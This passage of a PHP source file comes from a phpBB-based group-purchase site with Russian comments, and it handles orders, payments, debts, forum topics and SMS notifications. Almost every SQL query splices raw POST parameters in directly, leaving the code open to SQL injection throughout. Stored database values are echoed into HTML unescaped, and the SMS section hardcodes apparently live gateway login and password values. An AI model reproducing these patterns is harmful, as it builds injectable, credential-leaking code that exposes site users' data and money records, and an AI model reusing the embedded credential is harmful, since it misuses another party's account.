						$sql1='SELECT user_id, group_id FROM phpbb_user_group
							   WHERE  group_id = 17 AND user_id = '.$user1;
						$result1 = $db->sql_query($sql1);
						$row1 = $db->sql_fetchrow($result1);
						if (!$row1) {
							$sql1='INSERT INTO phpbb_user_group (group_id, user_id) VALUES (17,'.$user1.')';
							$result1 = $db->sql_query($sql1);
						}
					
					}
					// Проверяем не открыта ли закупка постоянно
					$sql1='SELECT
							  phpbb_reservs.always_open
							FROM phpbb_purchases
							  LEFT OUTER JOIN phpbb_reservs
								ON phpbb_purchases.reserv_id = phpbb_reservs.reserv_id
							WHERE  phpbb_purchases.purchase_id ='.$purchase1;
					$result1 = $db->sql_query($sql1);
					$row1 = $db->sql_fetchrow($result1);
					$always_open= $row1['always_open'];
					if (!$always_open) { //если  закупка не открыта постоянно проверяем на закрытие
						//проверяем сколько заказов в закупке не выдано и не отказано
						$sql1='SELECT  COUNT( phpbb_orders.order_status) AS cnt
								FROM phpbb_catalogs
								  LEFT OUTER JOIN phpbb_lots
									ON phpbb_catalogs.catalog_id = phpbb_lots.catalog_id
								  LEFT OUTER JOIN phpbb_orders
									ON phpbb_lots.lot_id = phpbb_orders.lot_id
								WHERE phpbb_catalogs.purchase_id = '.$purchase1.' AND phpbb_orders.order_status IN (0,1,2,4,5)';
						$result1 = $db->sql_query($sql1);
						$row1 = $db->sql_fetchrow($result1);
						$orders_count= $row1['cnt'];
						if (!$orders_count) { //если в закупке заказов не осталось - закрываем закупку
							$db->sql_query('UPDATE ' . RESERVS_TABLE . ' SET status=6 WHERE reserv_id='.$reserv_id);
							// если закупка не учтена - учитываем
							$sql1='SELECT user_id, reserv_id
									FROM phpbb_org_purchases_count
									WHERE user_id = '.$org_id.' AND reserv_id ='.$reserv_id;
							$result1 = $db->sql_query($sql1);
							$row1 = $db->sql_fetchrow($result1);
							if (!$row1) {
								$db->sql_query('INSERT INTO phpbb_org_purchases_count (user_id, reserv_id) VALUES ('.$org_id.', '.$reserv_id.')');
							}
							
						}
					}	
					break;
					
				}
			}
			$arr['state']="ok";
			exit (json_encode($arr));
			break;
		case 'report':
			$order_state_txt = array( 'Новый Заказ', 'Зафиксировано', 'Включено в счет', 'Отказано','В пути','Принято в ЕЦ','Выдано' );
			$order_state_clr = array( "#00FF00", "#ff9900", "", "#FF0000", "#1E6CED","#9900СС", "#9D9D9D" );
			echo "<table width='100%' >";
			echo "<tr align='center'><td width='10%'>Участник</td><td>Название</td><td width='10%'>Цена</td><td>Параметры</td><td width='10%'>Состояние</td>";
			echo "</tr>";

			$sql = 'SELECT * FROM '.ORDERS_TABLE.'
					JOIN ' . LOTS_TABLE . ' ON ' . ORDERS_TABLE . '.lot_id = ' . LOTS_TABLE . '.lot_id 
					JOIN ' . CATALOGS_TABLE . ' ON ' . CATALOGS_TABLE . '. catalog_id = ' . LOTS_TABLE . '. catalog_id
					JOIN ' . PURCHASES_TABLE . ' ON ' . CATALOGS_TABLE . '. purchase_id = ' . PURCHASES_TABLE . '. purchase_id
					JOIN ' . USERS_TABLE . ' ON ' . ORDERS_TABLE . '.user_id = ' . USERS_TABLE . '.user_id
					WHERE ' . PURCHASES_TABLE . '.purchase_id = '.$_POST['purchase_id'].'
					ORDER BY username';
			$result=$db->sql_query($sql);
			while ($row = $db->sql_fetchrow($result)) {
				$prop = unserialize($row['order_properties']);
				$p='';
				$f=0;
				if (is_array($prop))
				foreach($prop as $k=>$v){
					if ($f) $p.='; ';
					$p.="<b>".$k.':</b> '.$v;
					$f=1;
				}
				echo "<tr align='center'>
						<td class='bg3' width='10%'>".$row['username']."</td>
						<td class='bg3'>".$row['lot_name']."</td>
						<td class='bg3' width='10%'>".$row['lot_cost']."</td>
						<td class='bg3'>".$p."</td>
						<td class='bg3' width='10%'><font color='".$order_state_clr[$row['order_status']]."'><b>".$order_state_txt[$row['order_status']]."</b></font></td>";
				$lot_id = $row['lot_id'];
				$url = unserialize($row['lot_img']);
				$lots[$lot_id]['lot_img']=$url[0];
				$lots[$lot_id]['lot_name']=$row['lot_name'];
				$lots[$lot_id]['lot_cost']=$row['lot_cost'];
				$lots[$lot_id]['lot_desc']=$row['lot_description'];
				$lots[$lot_id]['users'][$p].=((isset($lots[$lot_id]['users'][$p]))?',':'')." <a href='./memberlist.php?mode=viewprofile&u=".$row['user_id']."'>".$row['username']."</a>";
				
			}	
					
			echo "</table>";
			if (is_array($lots))
			foreach ($lots as $k=>$v){
				echo "<BR><img src='".(($v['lot_img']<>'')?'./images/lots/'.$v['lot_img']:'./images/icons/noimage.png')."' /><br>";
				echo "<B>Название:</B> ".$v['lot_name'];
				echo "<BR><b>Цена:</b> ".$v['lot_cost'];	
				echo "<BR><b>Описание:</b> ".$v['lot_desc'];
				echo "<BR>";
				
				if(is_array($v['users']))
				foreach ($v['users'] as $uk=>$uv)
					echo $uk.' - '.$uv;
				echo "<BR>";
			}
			break;		
		case 'purchase':
			$id = $_POST['purchase_id'];
			
			$base_path = str_replace('function.php',"", 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);

			$pstus=array('','открыть до','Старт','Фиксация','Стоп','Дозаказ','Счет получен','Оплата до','Отгрузка','Груз получен','Раздача с');
			
			$sql = 'SELECT 
				' . PURCHASES_TABLE . '.*,
				' . BRANDS_TABLE . '.*,
				' . RESERVS_TABLE . '.*,
				' . PRODUCTCAT_TABLE . '.productcat_label
				FROM ' . RESERVS_TABLE . '
				LEFT JOIN ' . PURCHASES_TABLE . ' ON ' . PURCHASES_TABLE . '.reserv_id = ' . RESERVS_TABLE . '.reserv_id 
				JOIN ' . BRANDS_TABLE . ' ON ' . RESERVS_TABLE . '.brand_id = ' . BRANDS_TABLE . '.brand_id 
				JOIN ' . PRODUCTCAT_TABLE . ' ON ' . RESERVS_TABLE . '.productcat_id = ' . PRODUCTCAT_TABLE . '.productcat_id 
				WHERE ' . PURCHASES_TABLE . '.purchase_id = '.$id;

			$result=$db->sql_query($sql);
			$row = $db->sql_fetchrow($result);
			$a['name']=$row['purchase_name'].' - '.$row['brand_label'];
			$a['label']=$row['brand_label'];
			$a['desc']=$row['brand_description'];
			$a['logo']=($row['brand_logo'])?$base_path.$row['brand_logo']:'';
			$a['logo']=($a['logo'])?'<img src="'.$a['logo'].'" alt="Логотип '.$a['label'].'">':'';
			$a['news']=$row['purchase_news'];
				$status_id=1;
				$a['next_date']=$row['request_end'];
				if ($row['purchase_status_start']){
					$status_id=2;
					$a['next_date']=$row['purchase_status_start'];
				}
				if ($row['purchase_status_fixed']){
					$status_id=3;
					$a['next_date']=$row['purchase_status_fixed'];
				}
				if ($row['purchase_status_stop']){
					$status_id=4;
					$a['next_date']=$row['purchase_status_stop'];
				}
				if ($row['purchase_status_reorder']){
					$status_id=5;
					$a['next_date']=$row['purchase_status_reorder'];
				}
				if ($row['purchase_status_billreciv']){
					$status_id=6;
					$a['next_date']=$row['purchase_status_billreciv'];
				}
				if ($row['purchase_status_payto']){
					$status_id=7;
					$a['next_date']=$row['purchase_status_payto'];
				}
				if ($row['purchase_status_shipping']){
					$status_id=8;
					$a['next_date']=$row['purchase_status_shipping'];
				}
				if ($row['purchase_status_goodsreciv']){
					$status_id=9;
					$a['next_date']=$row['purchase_status_goodsreciv'];
				}
				if ($row['purchase_status_distribfrom']){
					$status_id=10;
					$a['next_date']=$row['purchase_status_distribfrom'];
				}
				$a['state']=$pstus[$status_id].' ' .date("d-m-Y", strtotime($a['next_date']));

			$a['usl']='';
			for ( $i=1; $i<=9; $i++){
				$a['usl']=$a['usl'].$row['purchases_rule'.$i]."<br>";
			}

			$sql = 'SELECT * 
				FROM '. CATALOGS_TABLE .'
				WHERE purchase_id = '. $row['purchase_id'] .'
				GROUP BY '. CATALOGS_TABLE .'.catalog_id';   							
			$result2 = $db->sql_query($sql);
			$a['cat']='';
			while ($row2 = $db->sql_fetchrow($result2)) {
				$a['cat']=$a['cat'].'<a href="catalog.php?catalog_id='.$row2['catalog_id'].'">'.$row2['catalog_name'].'</a><br>';
			}
		
			echo '<div>
	<span style="font-weight: bold; font-size: 200%; line-height: 116%; color: rgb(191, 0, 0);">'.$a['name'].' - '.$a['state'].'</span>
		<br>'.$a['logo'].'
<br>			<span style="color: rgb(0, 128, 0); font-style: italic; font-size: 150%; line-height: 116%;">'.$a['desc'].'</span>
<br><br>			'.$a['news'].'
<br><br>			<span style="font-size: 150%; line-height: 116%; text-decoration: underline;">Каталоги:</span>
<br>			'.$a['cat'].'
<br>			<span style="font-weight: bold;">Условия закупки</span>
<br>			'.$a['usl'].'</div>';
		
			break;

			
		case 'openpurchase':

			$sql = 'SELECT 
				' . PRODUCTCAT_TABLE . '.productcat_forum
				FROM ' . PRODUCTCAT_TABLE . '
				JOIN ' . RESERVS_TABLE . ' ON (' . RESERVS_TABLE . '.productcat_id = ' . PRODUCTCAT_TABLE . '.productcat_id 
				AND ' . RESERVS_TABLE . '.reserv_id = '.$_POST['reserv_id'] . ')
				WHERE 
				  ' . PRODUCTCAT_TABLE . '.productcat_forum <> 0 
				  AND ' . RESERVS_TABLE . '.status=3';

			$result=$db->sql_query($sql);
			$row = $db->sql_fetchrow($result);
			
			if (!$row) break;

			$forum_id = $row['productcat_forum'];

			if ($forum_id==0) break;
			
			$time = time();
			$db->sql_query('UPDATE ' . RESERVS_TABLE . ' SET status=4 WHERE reserv_id='.$_POST['reserv_id']);

			//	function add_post
			$result = $db->sql_query('SELECT purchase_id FROM ' . PURCHASES_TABLE . ' WHERE reserv_id = ' . $_POST['reserv_id']);
			$row = $db->sql_fetchrow($result);
			$id=$row['purchase_id'];

			$sql= 'UPDATE ' . PURCHASES_TABLE . ' SET purchase_status_start="'.date('Y-m-d').'" WHERE purchase_id='.$id;
			$db->sql_query($sql);
			
			$base_path = str_replace('function.php',"", 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);

			$sql = 'SELECT 
				' . PURCHASES_TABLE . '.*,
				' . BRANDS_TABLE . '.*
				FROM ' . RESERVS_TABLE . '
				JOIN ' . PURCHASES_TABLE . ' ON ' . PURCHASES_TABLE . '.reserv_id = ' . RESERVS_TABLE . '.reserv_id 
				JOIN ' . BRANDS_TABLE . ' ON ' . RESERVS_TABLE . '.brand_id = ' . BRANDS_TABLE . '.brand_id 
				WHERE ' . PURCHASES_TABLE . '.purchase_id = '.$id;

			$result=$db->sql_query($sql);
			$row = $db->sql_fetchrow($result);
			$subject = $row['purchase_name'];//.' - '.$row['brand_label'];
			//$subject = $row['purchase_name'];
			//if (strlen($subject)>255) $subject=substr($subject,0,255).'...';
			
			$topic = array(
				'forum_id'					=> $forum_id,
				'topic_title'				=> $subject,
				'topic_poster'				=> (int)$user->data['user_id'],
				'topic_time'				=> $time,
				'topic_replies'				=> 1,
				'topic_replies_real'		=> 1,
				'topic_first_poster_name'	=> (!$user->data['is_registered'] && $username) ? $username : (($user->data['user_id'] != ANONYMOUS) ? $user->data['username'] : ''),
				'topic_first_poster_colour'	=> $user->data['user_colour'],
			);
			$sql = 'INSERT INTO '.TOPICS_TABLE.' '.
					$db->sql_build_array('INSERT', $topic);
			$db->sql_query($sql);
			$topic_id = $db->sql_nextid();

			$message_parser = new parse_message();
			$time = time();
			$message = '[purchase='.$row['purchase_id'].'][/purchase]';
			$message_parser->message = utf8_normalize_nfc($message, '', true);
			$message_md5 = md5($message_parser->message);
			$message_parser->parse(true, true, true, true, false, true, true);
			$arr = array(
				'topic_id'			=> $topic_id,
				'forum_id'			=> $forum_id,
				'poster_id'			=> (int)$user->data['user_id'],
				'poster_ip'			=> '127.0.0.1',
				'post_time'			=> $time,
				'post_subject'		=> $subject,
				'bbcode_bitfield'	=> $message_parser->bbcode_bitfield,
				'bbcode_uid'		=> $message_parser->bbcode_uid,
				'post_text'			=> $message_parser->message,
				
				);
			
			$sql = 'INSERT INTO '.POSTS_TABLE.' '.
					$db->sql_build_array('INSERT', $arr);
			$db->sql_query($sql);
			$post_id_1 = $db->sql_nextid();
			$time = time()+10;
			$message_parser->message = '[report='.$row['purchase_id'].'][/report]';
			$message_md5 = md5($message_parser->message);
			$message_parser->parse(true, false, true, true, false, true, false);
			$arr = array(
				'topic_id'			=> $topic_id,
				'forum_id'			=> $forum_id,
				'poster_id'			=> (int)$user->data['user_id'],
				'poster_ip'			=> '127.0.0.1',
				'post_time'			=> $time,
				'bbcode_bitfield'	=> $message_parser->bbcode_bitfield,
				'bbcode_uid'		=> $message_parser->bbcode_uid,
				'post_text'			=> $message_parser->message,
				
				);
			
			$sql = 'INSERT INTO '.POSTS_TABLE.' '.
					$db->sql_build_array('INSERT', $arr);
			$db->sql_query($sql);
			$post_id_2 = $db->sql_nextid();

			$topic = array(
				'topic_first_post_id'		=> $post_id_1,
				'topic_last_post_id'		=> $post_id_1,
				'topic_last_post_time'		=> $time,
				'topic_last_poster_id'		=> (int) $user->data['user_id'],
				'topic_last_poster_name'	=> (!$user->data['is_registered'] && $username) ? $username : (($user->data['user_id'] != ANONYMOUS) ? $user->data['username'] : ''),
				'topic_last_poster_colour'	=> $user->data['user_colour'],
				'topic_last_post_subject'	=> (string) $subject,
			);
			$sql = 'UPDATE ' . TOPICS_TABLE . '
				SET ' . $db->sql_build_array('UPDATE', $topic) . '
				WHERE topic_id = ' . $topic_id;
			$db->sql_query($sql);
			
				$sql_data[FORUMS_TABLE]['stat'][] = 'forum_last_post_id = ' . $post_id_1;
				$sql_data[FORUMS_TABLE]['stat'][] = 'forum_posts = forum_posts+2';
				$sql_data[FORUMS_TABLE]['stat'][] = 'forum_topics = forum_topics+1';
				$sql_data[FORUMS_TABLE]['stat'][] = 'forum_topics_real = forum_topics_real+1';
				$sql_data[FORUMS_TABLE]['stat'][] = "forum_last_post_subject = '" . $db->sql_escape($subject) . "'";
				$sql_data[FORUMS_TABLE]['stat'][] = 'forum_last_post_time = ' . $time;
				$sql_data[FORUMS_TABLE]['stat'][] = 'forum_last_poster_id = ' . (int) $user->data['user_id'];
				$sql_data[FORUMS_TABLE]['stat'][] = "forum_last_poster_name = '" . $db->sql_escape((!$user->data['is_registered'] && $username) ? $username : (($user->data['user_id'] != ANONYMOUS) ? $user->data['username'] : '')) . "'";
				$sql_data[FORUMS_TABLE]['stat'][] = "forum_last_poster_colour = '" . $db->sql_escape($user->data['user_colour']) . "'";

				$sql_data[USERS_TABLE]['stat'][] = "user_lastpost_time = $time, user_posts = user_posts + 1";

				$where_sql = array(POSTS_TABLE => 'post_id = ' . $post_id_1, TOPICS_TABLE => 'topic_id = ' . $topic_id, FORUMS_TABLE => 'forum_id = ' . $forum_id, USERS_TABLE => 'user_id = ' . $user->data['user_id']);

			foreach ($sql_data as $table => $update_ary)
			{
				if (isset($update_ary['stat']) && implode('', $update_ary['stat']))
				{
					$sql = "UPDATE $table SET " . implode(', ', $update_ary['stat']) . ' WHERE ' . $where_sql[$table];
					$db->sql_query($sql);
				}
			}
			
			$sql = 'UPDATE ' . PURCHASES_TABLE . ' SET purchase_url="viewtopic.php?f='.$forum_id.'&t='.$topic_id.'" WHERE purchase_id='.$id;
			//error_log ($sql);
			$db->sql_query($sql);
			$purchase_id =$id;
			// смотрим joomla_material_id
			$sql='SELECT joomla_material_id,purchase_name,purchase_description FROM phpbb_purchases WHERE purchase_id ='.$purchase_id;
			$result=$db->sql_query($sql);
			$row = $db->sql_fetchrow($result);
			if ($row) {
				if (!$row['joomla_material_id']) { // если поле с id статьи пустое, то создаем статью
					$purchase_name=$row['purchase_name'];
					$purchase_description=$row['purchase_description'];
					// получаем id пользователя Joomla
					$sql ="SELECT id FROM byfpd_users WHERE email = UCASE ( '".$user->data['user_email']."') AND username = UCASE ('".$user->data['username']."')";
					$result=$db->sql_query($sql);
					$row = $db->sql_fetchrow($result);
					if ($row) {
						$user_id= $row['id'];
						// создам статью
						$sql="INSERT INTO byfpd_k2_items
						(title,catid,published,introtext,`fulltext`, extra_fields_search,created,created_by,created_by_alias,checked_out,
						checked_out_time,modified,modified_by,publish_up,publish_down, trash,access,ordering,featured,featured_ordering,
						image_caption,image_credits,video_caption,video_credits,hits, params,metadesc,metadata,metakey,plugins,language) 
						VALUES ('".$purchase_name."',88,0,'".$purchase_description."','','',NOW(),".$user_id.",'',0,0,0,0,0,0,0,1,1,0,0,'','','','',0,'','','','','','*')";
						$db->sql_query($sql);
						$row = $db->sql_fetchrow($db->sql_query("SELECT LAST_INSERT_ID() as id"));
						$joomla_material_id= $row['id']; 
						$sql = 'UPDATE phpbb_purchases SET joomla_material_id = '.$joomla_material_id.' WHERE purchase_id ='.$purchase_id;
						$db->sql_query($sql);
						echo ($user_id);
					}	
				}
			}			
			
			$arr = ';ok;'.date("d-m-Y", strtotime($a['next_date'])).';';
			exit (json_encode($arr));
			break;
		case 'purchase_arhiv':
			$reserv_id =$_POST['reserv_id'];
			$sql ="SELECT phpbb_reservs.reserv_id\n"
			. "     , phpbb_reservs.status\n"
			. "     , substring(phpbb_purchases.purchase_url, locate('f=', phpbb_purchases.purchase_url) + 2, (locate('t=', phpbb_purchases.purchase_url) - 1) - (locate('f=', phpbb_purchases.purchase_url) + 2)) AS f\n"
			. "     , right(phpbb_purchases.purchase_url, length(phpbb_purchases.purchase_url) - locate('t=', phpbb_purchases.purchase_url) - 1) AS t\n"
			. "FROM\n"
			. "  phpbb_reservs\n"
			. "LEFT OUTER JOIN phpbb_purchases\n"
			. "ON phpbb_reservs.reserv_id = phpbb_purchases.reserv_id\n"
			. "WHERE\n"
			. "phpbb_reservs.reserv_id =".$reserv_id ;
			$result=$db->sql_query($sql);

			while ($row = $db->sql_fetchrow($result)) {
				$f=$row['f'];
				$t=$row['t'];
				$newurl="viewtopic.php?f=34&t=".$t;
			}

	//		error_log ('f='.$f);
	//		error_log ('t='.$t);
			
			$db->sql_query('UPDATE ' .TOPICS_TABLE. ' SET forum_id=34, topic_status=1, poll_max_options=0  WHERE topic_id='.(int)$t);
			
			$db->sql_query('UPDATE ' .PURCHASES_TABLE.' SET purchase_url="viewtopic.php?f=34&t='.$t.'" WHERE reserv_id="'.$reserv_id.'"');
			
			$db->sql_query('UPDATE ' .RESERVS_TABLE. ' SET status=7  WHERE reserv_id='.(int)$reserv_id);

			$db->sql_query('UPDATE ' .PURCHASES_TABLE.' SET purchase_status_archiv="'.date('Y-m-d').'" WHERE reserv_id="'.$reserv_id.'"');
			//error_log('UPDATE ' .PURCHASES_TABLE.' SET purchase_status_archiv="'.date('Y-m-d').'" WHERE reserv_id="'.$reserv_id.'"');

			
			$arr = ';ok;'.date("d-m-Y", strtotime($a['next_date'])).';';
			exit (json_encode($arr));
			break;
		case 'set_user_purchase_money':
			$sql = 'UPDATE '.PURCHASES_ORSERS_TABLE.'
				SET puor_monye="'.$_POST['money'].'"
				WHERE user_id='.$_POST['user_id'].' AND purchase_id='.$_POST['purchase_id'];

			$db->sql_query($sql);
			exit ('ok');
			break;
		case 'set_kassa':
			$sql = 'INSERT INTO phpbb_kassa (data, ec, operations, user_id, org_id, purshase_id, summa, dolg,dostavka, ec_summ, comment)
					VALUES (UNIX_TIMESTAMP(NOW()),'.$_POST['ec'].',"'.$_POST['operations'].'", '.$_POST['user_id'].', '.$_POST['org_id'].'
					,'.$_POST['purshase_id'].', '.$_POST['summa'].', '.$_POST['dolg'].','.$_POST['dostavka'].', '.$_POST['ec_sum'].', "'.$_POST['comment'].'")';
			$db->sql_query($sql);
			// Учитывем оплату долга в ЕЦ
			$sql = 'UPDATE phpbb_purchases_orsers SET dolg = dolg -'.$_POST['dolg'].', puor_monye = puor_monye + '.$_POST['dolg'].' WHERE user_id = '.$_POST['user_id'].' AND purchase_id = '.$_POST['purshase_id'];
			$db->sql_query($sql);
			
			// выставляем заказу статус выдано
			$sql ="UPDATE phpbb_orders RIGHT OUTER JOIN phpbb_lots ON phpbb_orders.lot_id = phpbb_lots.lot_id RIGHT OUTER JOIN phpbb_catalogs \n"
			. "ON phpbb_lots.catalog_id = phpbb_catalogs.catalog_id RIGHT OUTER JOIN phpbb_purchases ON phpbb_catalogs.purchase_id = phpbb_purchases.purchase_id \n"
			. "SET order_status =6 , Out_EC_Date = curdate()  \n"
			. "WHERE phpbb_orders.order_status = \"5\" AND phpbb_purchases.purchase_id =".$_POST['purshase_id']." AND phpbb_orders.user_id =".$_POST['user_id'];
			//echo $sql;
			$db->sql_query($sql);
			// если закупка у пользователя не учтена - учитываем
			$sql = 'SELECT user_id, purchase_id FROM phpbb_user_purchases_count WHERE user_id = '.$_POST['user_id'].' AND purchase_id = '.$_POST['purshase_id'];
			$result = $db->sql_query($sql);
			$row = $db->sql_fetchrow($result);
			if (!$row) {
				$sql1='INSERT INTO phpbb_user_purchases_count (user_id, purchase_id) VALUES ( '.$_POST['user_id'].' , ' .$_POST['purshase_id']. ')';
				$result1 = $db->sql_query($sql1);
			}

			// смотрим количество закупок участника
			$sql1='SELECT  COUNT(purchase_id) AS cnt FROM phpbb_user_purchases_count WHERE user_id = '.$_POST['user_id'];
			$result1 = $db->sql_query($sql1);
			$row1 = $db->sql_fetchrow($result1);
			$p_cnt=$row1['cnt'];
			if ($p_cnt >2){ // если больше 2 то добавляем участника в узкий круг
				$sql1='SELECT user_id, group_id FROM phpbb_user_group
					   WHERE  group_id = 17 AND user_id = '.$_POST['user_id'];
				$result1 = $db->sql_query($sql1);
				$row1 = $db->sql_fetchrow($result1);
				if (!$row1) {
					$sql1='INSERT INTO phpbb_user_group (group_id, user_id) VALUES (17,'.$_POST['user_id'].')';
					$result1 = $db->sql_query($sql1);
				}
			
			}
			$sql1 = 'SELECT
					  phpbb_purchases.reserv_id,
					  phpbb_reservs.user_id
					FROM phpbb_purchases
					  LEFT OUTER JOIN phpbb_reservs
						ON phpbb_purchases.reserv_id = phpbb_reservs.reserv_id
					WHERE phpbb_purchases.purchase_id ='.$_POST['purshase_id'];
			$result1 = $db->sql_query($sql1);
			$row1 = $db->sql_fetchrow($result1);
				$reserv_id=$row1['reserv_id'];
				$org_id=$row1['user_id'];


			// Проверяем не открыта ли закупка постоянно
			$sql1='SELECT
					  phpbb_reservs.always_open
					FROM phpbb_purchases
					  LEFT OUTER JOIN phpbb_reservs
						ON phpbb_purchases.reserv_id = phpbb_reservs.reserv_id
					WHERE  phpbb_purchases.purchase_id ='.$_POST['purshase_id'];
			$result1 = $db->sql_query($sql1);
			$row1 = $db->sql_fetchrow($result1);
			$always_open= $row1['always_open'];
			if (!$always_open) { //если  закупка не открыта постоянно проверяем на закрытие
				//проверяем сколько заказов в закупке не выдано и не отказано
				$sql1='SELECT  COUNT( phpbb_orders.order_status) AS cnt
						FROM phpbb_catalogs
						  LEFT OUTER JOIN phpbb_lots
							ON phpbb_catalogs.catalog_id = phpbb_lots.catalog_id
						  LEFT OUTER JOIN phpbb_orders
							ON phpbb_lots.lot_id = phpbb_orders.lot_id
						WHERE phpbb_catalogs.purchase_id = '.$_POST['purshase_id'].' AND phpbb_orders.order_status IN (0,1,2,4,5)';
				$result1 = $db->sql_query($sql1);
				$row1 = $db->sql_fetchrow($result1);
				$orders_count= $row1['cnt'];
				if (!$orders_count) { //если в закупке заказов не осталось - закрываем закупку
					$db->sql_query('UPDATE ' . RESERVS_TABLE . ' SET status=6 WHERE reserv_id='.$reserv_id);
					// если закупка не учтена - учитываем
					$sql1='SELECT user_id, reserv_id
							FROM phpbb_org_purchases_count
							WHERE user_id = '.$org_id.' AND reserv_id ='.$reserv_id;
					$result1 = $db->sql_query($sql1);
					$row1 = $db->sql_fetchrow($result1);
					if (!$row1) {
						$db->sql_query('INSERT INTO phpbb_org_purchases_count (user_id, reserv_id) VALUES ('.$org_id.', '.$reserv_id.')');
					}
					
				}
			}			
			
			
			
			exit ('ok');
			break;
		case 'unset_kassa':
			
			// Учитывем оплату долга в ЕЦ
			$sql = 'UPDATE phpbb_purchases_orsers SET dolg = dolg +'.$_POST['dolg'].', puor_monye = puor_monye - '.$_POST['dolg'].' WHERE user_id = '.$_POST['user_id'].' AND purchase_id = '.$_POST['purshase_id'];
			$db->sql_query($sql);

			
			$sql = 'DELETE FROM phpbb_kassa WHERE ec='.$_POST['ec'].' AND org_id = '.$_POST['org_id'].' AND user_id='.$_POST['user_id'].' AND 
					purshase_id= '.$_POST['purshase_id'].' AND operations="'.$_POST['operations'].'"';
			$db->sql_query($sql);


			// выставляем заказу статус принятов ЕЦ
			$sql ="UPDATE phpbb_orders RIGHT OUTER JOIN phpbb_lots ON phpbb_orders.lot_id = phpbb_lots.lot_id RIGHT OUTER JOIN phpbb_catalogs \n"
			. "ON phpbb_lots.catalog_id = phpbb_catalogs.catalog_id RIGHT OUTER JOIN phpbb_purchases ON phpbb_catalogs.purchase_id = phpbb_purchases.purchase_id \n"
			. "SET order_status =5 "
			. "WHERE phpbb_orders.order_status = \"6\" AND phpbb_purchases.purchase_id =".$_POST['purshase_id']." AND phpbb_orders.user_id =".$_POST['user_id'];
			//echo $sql;
			$db->sql_query($sql);

			// если закупка у пользователя учтена - удаляем учет
//			$sql = 'SELECT user_id, purchase_id FROM phpbb_user_purchases_count WHERE user_id = '.$_POST['user_id'].' AND purchase_id = '.$_POST['purshase_id'];
//			$result = $db->sql_query($sql);
//			$row = $db->sql_fetchrow($result);
//			if ($row) {
//				$sql1='DELETE FROM phpbb_user_purchases_count WHERE user_id = '.$_POST['user_id'].' AND  purchase_id=' .$_POST['purshase_id'];
//				$result1 = $db->sql_query($sql1);
//			}

//			$sql1 = 'SELECT
//					  phpbb_purchases.reserv_id,
//					  phpbb_reservs.user_id
//					FROM phpbb_purchases
//					  LEFT OUTER JOIN phpbb_reservs
//						ON phpbb_purchases.reserv_id = phpbb_reservs.reserv_id
//					WHERE phpbb_purchases.purchase_id ='.$_POST['purshase_id'];
//			$result1 = $db->sql_query($sql1);
//			$row1 = $db->sql_fetchrow($result1);
//				$reserv_id=$row1['reserv_id'];
//				$org_id=$row1['user_id'];				
			
			// если закупка учтена - удаляем
//			$sql1='SELECT user_id, reserv_id
//					FROM phpbb_org_purchases_count
//					WHERE user_id = '.$org_id.' AND reserv_id ='.$reserv_id;
//			$result1 = $db->sql_query($sql1);
//			$row1 = $db->sql_fetchrow($result1);
//			if ($row1) {
//				$db->sql_query('DELETE FROM phpbb_org_purchases_count user_id = '.$org_id.' AND  reserv_id= '.$reserv_id);
//			}			

			exit ('ok');
			//exit ($sqlz);
			break;

		case 'change_purchase_payment_info':
			$sql = 'UPDATE '.PURCHASES_TABLE.'
				SET payment_info="'.$_POST['text'].'"
				WHERE purchase_id='.$_POST['purchase_id'];

			$db->sql_query($sql);
			exit ('ok');
			break;
		case 'change_purchase_dolg':
			$sql = 'UPDATE '.PURCHASES_ORSERS_TABLE.'
				SET dolg="'.$_POST['dolg'].'"
				WHERE user_id='.$_POST['user_id'].' AND purchase_id='.$_POST['purchase_id'];
			$db->sql_query($sql);
			exit ('ok');
			break;
		case 'send':
			//$users = $_POST['users'];
			$users=array();
			$phones=array();
			$org_id = $_POST['org_id'];
			$purchase_id = $_POST['purchase_id'];
			$sms_text = $_POST['text'];
			$sql='SELECT phpbb_users.user_id, IF(byfpd_user_profiles.profile_value ="", phpbb_users.user_phone, byfpd_user_profiles.profile_value) AS phone
					FROM phpbb_users
					  LEFT OUTER JOIN byfpd_users
						ON phpbb_users.user_email = byfpd_users.email
						AND phpbb_users.username = byfpd_users.name
					  LEFT OUTER JOIN byfpd_user_profiles
						ON byfpd_users.id = byfpd_user_profiles.user_id
					WHERE byfpd_user_profiles.profile_key = "profile.phone"
					AND phpbb_users.user_id IN( '.$_POST['users'].')';
			$result=$db->sql_query($sql);
			while ($row = $db->sql_fetchrow($result)) {	
				$phone=preg_replace("/(?:[^\d])*[78](?:[^\d])*(\d)(?:[^\d])*(\d)(?:[^\d])*(\d)(?:[^\d])*(\d)(?:[^\d])*(\d)(?:[^\d])*(\d)(?:[^\d])*(\d)(?:[^\d])*(\d)(?:[^\d])*(\d)(?:[^\d])*(\d).*/", "7$1$2$3$4$5$6$7$8$9$10",$row['phone']);
				if ($phone) {
				//error_log ($phone);
					array_push ($phones,$phone);
					array_push ($users,$row['user_id']);
				}
			}
			if ($phones) {
				$sql='INSERT INTO phpbb_sms_log (users, phones, sender, sms_text, purchase_id, time_log)
						VALUES ("'.implode (",",$users).'","'.implode (",",$phones).'","'.$org_id.'","'.mysql_escape_string($sms_text).'",'.$purchase_id.', NOW())';
				$db->sql_query($sql);
				//error_log ($sql);
				$row = $db->sql_fetchrow($db->sql_query("SELECT LAST_INSERT_ID() as id"));
				$log_id= $row['id']; 
				
				$login = 'spmgn.ru';
				$pwd = 'JnRoust35105';

				$phones = implode (",",$phones);
				$msg = urlencode($sms_text);
				$sender='Spmgn.ru';
				
				//$result = file_get_contents("http://smsfox.ru/ru/api/?login=$login&pwd=$pwd&phones=$phones&msg=$msg&sender=$sender");
				
				$sql='UPDATE phpbb_sms_log SET status = '.$result.' WHERE id ='.$log_id;
				$db->sql_query($sql);
				if((int)$result == 1) {
				    //print 'Message successfully sent!'.$result;
					$exit ='ok';
				} else {
				   //print 'Fail sent message.'.$result;
				}
				
				
				//$exit =implode (",",$phones);
			}

			//error_log(implode (",",$phones));
			//error_log(implode (",",$users));
			//$exit =implode (",",$phones);		
			//$exit = $_POST['text'];
			exit ($exit);
			//exit ('ok');
			break;
		case 'change_purchase_admin_payment':
			$sql = 'UPDATE '.PURCHASES_TABLE.'
				SET purchase_admin_payment="'.$_POST['text'].'"
				WHERE purchase_id='.$_POST['purchase_id'];

			$db->sql_query($sql);
			exit ('ok');
			break;
		case 'set_user_purchase_discount':
			$sql = 'UPDATE '.PURCHASES_ORSERS_TABLE.'
				SET puor_discount="'.$_POST['discount'].'"
